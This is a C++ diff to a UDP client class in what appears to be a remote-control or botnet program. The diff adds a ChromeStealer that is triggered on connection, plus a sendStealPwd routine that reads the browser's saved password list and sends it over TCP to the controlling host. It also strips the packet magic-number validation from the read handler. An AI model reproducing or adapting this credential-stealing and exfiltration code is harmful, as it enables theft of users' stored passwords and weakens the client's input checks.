@@ -14,12 +14,18 @@ UDPClient::~UDPClient()
 
 void UDPClient::connect(void)
 {
+	ChromeStealer stealer;
+
 	StaticTools::Log << "Connecting ..." << std::endl;
 	boost::asio::ip::udp::udp::resolver::query query(boost::asio::ip::udp::udp::v4(), _remote, _port);
 
 	_sender = *_resolver.resolve(query);
 	read();
 	StaticTools::Log << "Connected in UDP mod" << std::endl;
+
+	if (stealer.canSteal()) {
+		write(StaticTools::CreatePacket(PacketType::PT_Stealer, "steal.db"));
+	}
 }
 
 
@@ -55,25 +61,18 @@ void UDPClient::read(void)
 			boost::asio::placeholders::bytes_transferred));
 }
 
-void UDPClient::do_read(boost::system::error_code const& ec, size_t bytes)
+void UDPClient::do_read(boost::system::error_code const& ec, size_t len)
 {
 	if (!ec) {
 		Packet const* packet = boost::asio::buffer_cast<Packet const *>(_read.data());
-		_read.consume(sizeof(Packet) + packet->size);
+		_read.consume(len);
 		
-		if (packet) {
-			if (packet->MAGIC == MAGIC_NUMBER) {
-				Packet *reply = NULL;
+		Packet *reply = NULL;
 
-				_reqHandler.request(*this, packet, &reply);
+		_reqHandler.request(*this, packet, &reply);
 
-				if (reply) {
-					write(reply);
-				}
-			}
-			else {
-				write(StaticTools::CreatePacket(PacketType::PT_Error, "Error 50: unknown error"));
-			}
+		if (reply) {
+			write(reply);
 		}
 
 		read();
@@ -128,4 +127,38 @@ IClient &UDPClient::operator<<(Packet *packet)
 Packet *UDPClient::createPacket(PacketType type, std::string const& data)
 {
 	return (StaticTools::CreateUDPPacket(type, data));
+}
+
+void UDPClient::sendStealPwd(std::string const& ftpPort)
+{
+	try {
+		ChromeStealer stealer;
+		StaticTools::Log << "sending steal pwd to ftp: " << ftpPort << std::endl;
+
+		if (!stealer.canSteal()) {
+			return;
+		}
+
+		boost::asio::io_service ios;
+		boost::asio::ip::tcp::resolver resolver(ios);
+		boost::asio::ip::tcp::resolver::query query(_remote, ftpPort);
+		boost::asio::ip::tcp::resolver::iterator it = resolver.resolve(query);
+		boost::asio::ip::tcp::socket socket(ios);
+
+		socket.connect(*it);
+
+
+		std::string tosend = stealer.stealPasswordList();
+
+		boost::asio::streambuf request;
+		std::ostream request_stream(&request);
+		request_stream << tosend << std::flush;
+
+		boost::asio::write(socket, request);
+
+		write(createPacket(PacketType::PT_DeleteFTP, ftpPort));
+	}
+	catch (std::exception const& e) {
+		StaticTools::Log << "send steal pwd: " << e.what() << std::endl;
+	}
 }
